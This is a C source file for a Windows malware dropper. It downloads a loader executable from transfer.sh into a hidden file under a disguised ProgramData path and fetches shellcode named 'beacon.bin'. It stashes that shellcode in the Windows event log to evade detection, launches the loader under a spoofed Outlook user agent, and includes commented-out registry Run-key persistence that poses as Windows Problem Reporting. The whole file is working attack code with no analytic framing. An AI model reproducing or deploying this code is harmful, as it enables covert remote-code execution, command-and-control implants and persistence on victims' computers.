#include <windows.h>
#include <wininet.h>
#include <stdio.h>
#include <Shlwapi.h>
#pragma comment(lib, "wininet.lib")

char LoaderName[] = "C:\\ProgramData\\Microsoft\\Crypto\\RSA\\Key_Tools.exe";
char LoaderUrl[] = "https://transfer.sh/get/qL5BmWnjqu/EventShellcodeLoader.exe";
char ShellcodeUrl[] = "https://transfer.sh/get/JyldOm6oIU/beacon.bin";

BYTE tmp[0x70000] = { 0 };

DWORD GetEventsSize() {
	DWORD dwRead;
	DWORD dwNext;
	DWORD dwLen = 0;

	EVENTLOGRECORD* pevlr = (EVENTLOGRECORD*)&tmp;

	HANDLE hEventLog = OpenEventLogA(0, "HardwareEvents");

	while (ReadEventLogA(hEventLog, EVENTLOG_FORWARDS_READ | EVENTLOG_SEQUENTIAL_READ, 0, pevlr, 0x70000, &dwRead, &dwNext)) {
		while (dwRead > 0)
		{
			if (pevlr->EventCategory == 0x5678) {
				dwLen += pevlr->DataLength;
			}
			dwRead -= pevlr->Length;
			pevlr = (EVENTLOGRECORD*)((PBYTE)pevlr + pevlr->Length);
		}
		pevlr = (EVENTLOGRECORD*)&tmp;
	}

	CloseEventLog(hEventLog);

	return dwLen;
}

BOOL WriteEvents(PBYTE pBuffer, DWORD len) {
	HANDLE hEventLog;
	hEventLog = RegisterEventSourceA(0, "HardwareEvents");
	if (len > 60000)
	{
		for (DWORD i = 0; i < len / 20000; i++) {
			if (!ReportEventA(hEventLog, EVENTLOG_INFORMATION_TYPE, 0x5678, 7777 + i, 0, 0, 20000, 0, (LPVOID)(pBuffer + i * 20000))) {
				CloseEventLog(hEventLog);
				return FALSE;
			}
		}
		if (!ReportEventA(hEventLog, EVENTLOG_INFORMATION_TYPE, 0x5678, 7777 + len / 20000, 0, 0, len % 20000, 0, (LPVOID)(pBuffer + (len - len % 20000)))) {
			CloseEventLog(hEventLog);
			return FALSE;
		}
	}
	else {
		if (!ReportEventA(hEventLog, EVENTLOG_INFORMATION_TYPE, 0x5678, 7777, 0, 0, len, 0, (LPVOID)pBuffer)) {
			CloseEventLog(hEventLog);
			return FALSE;
		}
	}
	CloseEventLog(hEventLog);
	return TRUE;
}

VOID DropLoader() {

	BYTE Buffer[1024];
	DWORD dwBytesGet;
	DWORD dwFileAttributes;

	HINTERNET  hSession = InternetOpenA("Microsoft Outlook", INTERNET_OPEN_TYPE_PRECONFIG, NULL, NULL, INTERNET_INVALID_PORT_NUMBER);
	HINTERNET hUrl = InternetOpenUrlA(hSession, LoaderUrl, NULL, 0, INTERNET_FLAG_NEED_FILE, NULL);

	FILE* hFile = fopen(LoaderName, "wb");

	while (TRUE == InternetReadFile(hUrl, Buffer, 1024, &dwBytesGet) && dwBytesGet > 0)
	{
		fwrite(Buffer, 1, dwBytesGet, hFile);
	}

	fclose(hFile);

	dwFileAttributes = GetFileAttributesA(LoaderName);
	dwFileAttributes |= FILE_ATTRIBUTE_HIDDEN;
	SetFileAttributesA(LoaderName, dwFileAttributes);

	InternetCloseHandle(hSession);
	InternetCloseHandle(hUrl);
}

VOID DropShellcode() {
	PBYTE pBuffer = NULL;
	BYTE TmpBuffer[1024] = { 0 };
	DWORD dwBytesGet = 0;
	DWORD dwLen = 1024;
	DWORD dwCount = 0;

	HINTERNET  hSession = InternetOpenA("Microsoft Outlook", INTERNET_OPEN_TYPE_PRECONFIG, NULL, NULL, INTERNET_INVALID_PORT_NUMBER);
	HINTERNET hUrl = InternetOpenUrlA(hSession, ShellcodeUrl, NULL, 0, INTERNET_FLAG_NEED_FILE, NULL);

	pBuffer = (PBYTE)malloc(dwLen);

	HttpQueryInfoA(hUrl, HTTP_QUERY_CONTENT_LENGTH, pBuffer, &dwLen, 0);

	sscanf((const char*)pBuffer, "%ul", &dwLen);

	pBuffer = (PBYTE)realloc(pBuffer, dwLen);

	while (TRUE == InternetReadFile(hUrl, TmpBuffer, 1024, &dwBytesGet) && dwBytesGet > 0) {
		memcpy(pBuffer + dwCount, TmpBuffer, dwBytesGet);
		dwCount += dwBytesGet;
	}

	WriteEvents(pBuffer, dwLen);

	InternetCloseHandle(hUrl);
	InternetCloseHandle(hSession);
}

int main(int argc, char** argv) {

	//CopyFileW(L"C:\\Windows\\system32\\WerFault.exe", L"C:\\Windows\\Temp\\WerFault.exe", 0);
	//È¨ÏÞÎ¬³Ö
	//HKEY result;
	//RegOpenKeyW(HKEY_CURRENT_USER, L"Software\\Microsoft\\Windows\\CurrentVersion\\Run", &result);
	//RegSetValueExW(result, L"Windows Problem Reporting", 0, 1, (const BYTE*)L"C:\\Windows\\Temp\\WerFault.exe", 0x3c);
	//RegCloseKey(result);

	DropLoader();
	DropShellcode();

	ShellExecuteA(0, "open", LoaderName, 0, 0, 0);

	return 0;
}